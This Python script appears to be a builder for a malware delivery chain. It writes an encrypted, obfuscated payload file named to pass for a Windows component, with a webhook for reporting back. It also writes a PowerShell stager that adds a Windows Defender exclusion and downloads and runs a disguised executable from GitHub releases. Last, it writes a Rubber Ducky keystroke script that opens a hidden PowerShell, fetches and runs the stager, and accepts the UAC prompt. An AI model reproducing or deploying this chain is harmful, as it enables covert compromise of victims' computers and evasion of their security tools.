import os
import sys
import json
from datetime import datetime
from cryptography.fernet import Fernet
debug = True

webhook = os.getenv('WEBHOOK')
client = os.getenv('CLIENT')
date = datetime.now().strftime("%d_%m_%Y")
time = datetime.now().strftime("%H_%M_%S")

repo = os.getenv('GITHUB_REPOSITORY')
date = datetime.now().strftime("%d_%m_%Y")
time = datetime.now().strftime("%H_%M_%S")

star = lambda : print('*'*50)
def list_vars():
    print(webhook)
    print(client)
    print(repo)
    star()

def decrypt(encrypted_data):
    fernet = Fernet(os.getenv('KEY').encode())
    decrypted_data = fernet.decrypt(encrypted_data)
    return decrypted_data.decode()

def setup_webhook():
    content = f"webhook = \'{webhook}\'\n"
    content += decrypt(b'gAAAAABnK8ko-EfvlMKMmjeX0bQcsyZYutZ2QhVfblhK8TlwspZ1_6RfbbUStogKt428iANQ9DaH1wr56s4lThI3RuQHbMPTL7gpwM4BtjaRHlHwREaZefuZ2K8R-UWW0720U78wzPWa3M6TVCwlALhn0UN-y1YVOin4ZvVhwGcE3aoFjnZYmSYhY_b4XfgEAonMe03sZMmuJOXXir1QHzoe5X2IfplIShx_4kHXgLZA8XGfP5pmjUl8QNZggQ85x1FffuZ0YdgEuWbngcbeZ1oo04V7fHPA66HLN722dcYzNDpMZI75RmLwVMTF9ylEBfv6b4UwZPdi_CSbKqOw1xFWJXXhr2pRCOPkUN6cfaXC17j_Bo_Pk2fbqe7OQ4J6fl0ojojZ-M98mcKFqtuJpgqgKlYEv19V_Oqu9_FQVAUBjjwZ_zwvppfWnu-pJu_GGGsY9_QDAq3ptKU1cUtvlHDnbrMSmwFUwBDqGlpjdi8-pz0UUhI6t8BtYzcL1ln-niSvbFWbsb1IhYmmnxrkvsLswKPJqalf0oWvHkTMuzF7XJSUDEbwoqx1-57ocMvUAU8nIIVP5z2YN1-nK99OGx4QS8W-taV1JY0EwKg6Ny4Dl3g_zRTp5h-4TW-WxGRApkZqHz6Lm1sY8ECD4QAOzKuQ945vFRJMdxM4Vu5QacvJZtBxhf_pAsVovpbQL6_SekS_d0xPG6vwRdaaypuk6slaPW_K0zTJPVWwyzoo-qgqKgx9yaGUEIBKEhG-lyDEkGVJOtOre4Jyp3T_KfZJuu5cZh7eylPd_M4DuyMK50b6Y4B1Oogyo_8wxBcHWU9Bt9QZiZo7V7LXg9I0Hx8KCFqhrHm8Px92yNMV3Aeo3DdU35vsCqbmSR_LyRKg3elayGGWP1H3us6T9jpfXFoY35jul1QqWIYarDgm7hZX7-mxSZtwGGv3XR-ucP2uUGmHyfFCgdB73AA_zBsGubjRn7la53nYkmUspSctUKGljn9izKOo9Xaj2Vwi9tDLsXC2X9rmcTXiulLKGU_Ieb8YAotVsJsqJa8Ni35D4fXqkcHcjKn4m8_gVAIkzONRrXi9YCaDEGLbKJDrsYzrWiD5RYN2aev_rBttBpx7H63LwOFtYc_qI0C8Ls-MCXJvcCkNxa_24L-6564e4Nc61Y7poGdpBIVDPxHsgEGTKdEuXub45qFlOIsQYVbVS6IVBMNxClizftQ3noGifZkLKBXed-g8MFcxvondhcdb551e_JjR5_4quETgx9h6xcP5_ZGsrT9hSH4EUDfBLyl--x1GpWyDGYa-a46kBIYOOm_WZosHtXnYMgRdyS6iPybFC8HO4EGt9CahlbE13DG_AUiK_YyS04UFjnoy5TMjJ33HYNxSKCtaoHlFoKlXZTYzXG3wwwmyVMWZl2FfniWuXZqJOrh0PT54pddBlAtQt47OEZSJnwjs1Tjzi2d2N3Lym0YdR2hFiD9V7akJv2jMKSYOKS9rRy_RIqQaRIeY2Lrnph3L1WU3uH7e_ged-Nmw5cZkK52G3C_zDZbyqGQpgI1VxM9oxoh6_Sd4gqBD3-yLDo7fLoTO4lmjEXVo3ZKC-Y3V_QNx-mSMDluvtiYObW3EaiB6-sKghKGRizElbOrqK-SPut7iISTRrE5uFVBlUpJz_EakGtCr7VfQKA5oOm3i3sUS2t3L0qQUsdWSd3WqDr_e9JHlkFnPE0J4CuoRRmRDZTxqB3Nx7y4lwd9EeKkBHZRRzqH1Rg6s4yC4H9_KWH1EE2h8QfgSV2rWUNjLINzSqG0Kkpt2jyWhKVx5Et5kUmkbOTr-_U1Nsa_u1Jx5TEJlYi9EMiAeXcr4UQPIFLwxmgsci1n208Y_3QNNtRax64xUDI6domTzd-xUVimSDsGe-Hin3HhFNukf38oJsc2cUDhSby5W7T4TxiODPk8VR4Xfc2TVv7ICrwZcrO_fX16f5-GwDtrELNDPyJsIHoOYFtzuBwGM0vb1ArtzFQVXVFLYwXXOHZi2iGK0FQ_jawkK_JPwWQi4dq0LuSiqZ-iXxlUFBX7k2JtzH6sViSLBak8njQR25oIeHsY0OinFu3X0E-UbWUdkVOucsJJGMx9x2_izcCgSMBeOUTZNculBOhxL0QMONLU1Jzm-7LtHlAtJcE6lhJut0z9pP3141vnaaisOLkIgbW4MVAfzslbHJpfYAVHIvspZSZQYbVRRFesHHtLz-QniDmwX0GUeFaKwQQRDUnBh8XAN93mJrQ142-U0Vaz7JMYIALoH3-c88Xma0o9YPwI1vjDpa9tfmvLjKrMmiJRAYZ3shF0vBtt2-dlq8Tx_zXrIyCOeslt74AQJBBqaadA52rPhXMdPwZmbB6IuUeCLbPmeBFHYsVTPJ4Qbmtc1T8nQvoggmv6BCPh2fQ7hYwiR-Edmv_4I2rFS5rqWn_ZEdBfcm6AY3V8S1WZxWAAPID5TDQ5bpOuo3ihnVjEtwkYG-55MJEDpQvMAgRqHUnBKFdt_MLbnn93jAFYMeNXfKCrRQOIhwakgbDMuZ89_R1PTmQHUo96Zy653PbTx5Emv_zgPBBOFEptP2TISFz1Q9mTGYQR2ZG5vhoIXGdtIFqc2jMIH3El59e41ZhFKFePrwrjhNu1WCZIPG_EzwCwE_U4uTiwgkU1_uoAigALPoHiNgZaPDiR5Qod-BPJY1lgWehEfn8EwjAOM-lN2_4JNVTVJ_0oX2UNILPZ--j0Z4eADG_V3WcNEH71vY1kuTl7U4f8UsZfligIX5t_r0BDKIYNVw0qA9DzNqdCAZwQnC6RyncPKe9WVOZjhhlNARgt6IcBY9moRB8oNJsO1W6ta3OIlNmtE27NUhYdBf_p9GEp-OQe6Bd1m5zyq1eOqYLQFpf8G9E6eFMFrTc4JOMAIeOMpbGbmNkXZ4buzbNi0Q_mRhgaEA_jk7VG7selZ0LGopvdKfRTUE2Q3ipPWww18hNoI2RH7QXeJZcw1pvhnUSbJTmuRNDueQs-mUqqz2Xh3W8P-7tR4j94ruZXVGjsUysXzq45qD42VcNSLnNZQWpBXArNtE2EmX3C4ecqbj67zvU37YLAaIcSUT_xyU-lNLxM86PaloYzJqZu5R1UDsR36KHBNiOSCRYrXy2mGVg7K6e1xbrBOTLk0xh0o3UD74-qimmM1o0qgOnKiHuPcgbybGPYUXp-RyM6C-mTd4feTF1PYHMBtp9OWqLhWGzpYbtn9Ln6PXMtSk5S7A3lOqKwhWrYtdQnugYU9Uz7S_xCYstlFUP8zbtnL0ZayMfwDWj8IZrLfTTHi58y8_YxjB1LsF-KnpGr5SS0f-qe5dboA7YasklIcSYTvnuYGg1vW7ZH7N25SJWwl_4Ub58XY0aYUym41nh2GZOWKGXa2OO8CLlYg8okaD29ZvRVjYdX7vKtadSJTk0ogSnLaY_gWgmh1ZbcwLQgWrJgsrClwuBh61n9gqsJlGEZg55BMDhUL9da7EUha5fy7JStsCqMZAQQzJfRA6sP8G7wAl12D2AFbOS3mJ7FgZDUXRaW4TL_tJ2o42meqdn70MwwKHanHTRhxm1xC1pfMu2LTvtsmx56OfJgev1LhZHsa5gNjn0olpVmKg5OPJdZrZ4Q--WofCrs2J-wIIBNP3QNDZtgXinoodGepqzfliK1B_-kPS0i1jfLkJP_3TVzO1RqRD77VidnpkYtgFfLGPl-UNxVZHwechsd5dCkQ5ErZ66wgqOdd83a1zP7FWiKvWEFDdvuG_ZoDLqey0iIQJGrqafruGE_pm_lERGGhyJaGxdryX9rxMh8iRBLbshXAlLv6ubCxmR010A3Ro6gL1xKKv7QiDCEMJKW0gIwwd7-L_iPba5zvBSomjkVNeFDzK29I61PDxQcADvQ5rjES2dTZAGN5HvlgeHljf0Gd1Hak87fyMBf9kzvkI2pHEaR-4ZzKKtCk1XwCKOkYsAvGmP3tcHZN22AFa0rJWFji9FUSQdGToXCajWzHDN-MQeGQCx_mSz1QVpMv_ZJ5U-CdqwdhK8wkEu3fRixu9gERbyI3hvIEVIIcXGU1KncU1-2U72rXwZkfNkpkk46On-WBq556_WE2zbduV4E78gs0NQf0N1vAHFqH8EQWJdpQjLzMYoCXJ6-R5zXGq2dv8ZA9H2zV7ILyjJHF9S-E6JWNPQO-7TdkbZUqLMCwl82ufVGTExQkdBddWsv6d73_J4bw6BZOVR3diqH0b05JlEAtxtoeh_3pzrpKHzY-Y74ySqncYv9-_fbzI-2AdMgiQofxd1RFfnuZDtVVscerP1KuBmf6Y1JTV7qaE5xNhLbn_mzH5awnKQ6iou0PJw_indQtqdNahUH6N_3jFspv_0Hv05xhmibd0q1MALGggBnaOdNKMtylA1Eo_IdlPnA3ViTauSjxx7AfdRlbF0GWzWzkg0fcacfATgFdAScArba7_6ZCME0rr_6F9-DJeFjw4F1k3YsaqjjI_tTiYXQsuWtyYue_Ru56S5jGjbQBSuFRJ6XKojro-WMpooglR11YFuBVT9S1OBsXQ2--GvrXGHShLIg8gZoY8d1nkf988Cn54XfIh4fwr7dWxLdbSEiaChxyaBA7Lertpiqc_0j4f79M_bBsEByjyz9Q1WP-yVn2WOmrENsoURNmkGDkQLwN-hGeK_SWWxe2vyqBvpJfuKnSl6-_xqQ7HoE1hOE8b6BT6PAQRr1FFAiS2mEgu_q5kEfgo7UFxUj--7zI98D6rH4FWNpoXSuTrlVOK3gWjxb6WduVJOejfrAdsM7iMEfgudgBBIhbmRwF1nDtzpVx_0sejumv8VpfdQqbHlRAqvxTNtMtMMth1mKWAG9SrN-76XZNom3MD0XdyXU5kDw-8GKIHTshq_CVgXeOYJjxbyCYNzeymIi54OTbxjXIWaSci2hTQmrmrf9D-cOOdiVCqGjlo7HMMacC3myaQl0Keq2nr5sIw9-p6BuJXx_PUhHin00hBVVxFY_YC2Bzr1Vxj5ooJwju6mmpmwN9o6nuiXmqAAh4_MAWKbif1azOdoQgQGScmbv8Vq5prwIflKXQ_kYl5m7jt1mfdYhNZFhMtCFptpIFq3HwJvVoVfJ_Zzac_a0M6GgaT7cPsX9UuSkVI6uvPo6uulymOieujGvv1qlToiFdkUeu0Vepllv12Y9lXDkXKLrGpKrk-eGtUngL8b3-Hi4OFPdMoU2TpDc-yFZWcPaez5rF55YJIhmskJLmZXC9zEU0LCuut88Gsa2Km_cR00Qz3_t-QBVVQ18N66MOuBboV5ChYDonBtxtmcUN3EpYmSI66UIpH4fS_7Q8_KpbqbszsAxvR7rcBhOYgarlzwlAsc9U5_PSsVxFU6ydNgeh1N1ScDFpyNi6uVh6p5XX75WIrE9zgtWEspKCbm-oQ39nvFR0w7vYG7qYQmh63-Cyup1ICn0LxTJ6grb6ztNYmQdrpK8bMP4gz9jRPLey5vyukxSkVYNRw7ZEliEciQyUdEIhB6JMMVar6Qw0S_jV1V1zBUA-gJMVsE9E5AfolRnlpxL_uj4moiyN_-VNeP_wKsjjJ1VNdXdYhz5qd29GtPiQlTLdAJyyL7BUGyRsqCw6ZOsMZ_K5VBDWp3v1JJD9jscfDx39ASPxFeBGpE6Haa03382j61IJJvhI5g==')
    with open('WindowsNt.py','w') as w:
        w.write(content)
        if debug:
            print('WindowsNt.py')
            print(content)
            star()

def setup_powershell():
    script = f'$path = "C:\\Users\\$env:USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Temp"\nSet-MpPreference -ExclusionPath $path\nInvoke-WebRequest -Uri "https://github.com/{repo}/releases/{client}/download/{client}.exe" -OutFile "$env:TEMP\\WindowsNt.exe"\nStart-Process "$env:TEMP\\WindowsNt.exe"\nexit;\n'
    with open(f'{client}.ps1','w') as w:
        w.write(script)
        if debug:
            print(f'{client}.ps1')
            print(script)
            star()

def setup_payload():
    payload = f'DELAY 2000\nGUI r\nDELAY 1000\nSTRING powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/{repo}/refs/heads/main/{client}.ps1" -UseBasicParsing).Content"\nDELAY 1000\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\n'
    with open('payload.dd','w') as w:
        w.write(payload)
        if debug:
            print('payload.dd')
            print(payload)
            star()

def main():
    if debug:
        list_vars
    setup_webhook()
    setup_powershell()
    setup_payload()

if __name__ == '__main__':
    main()
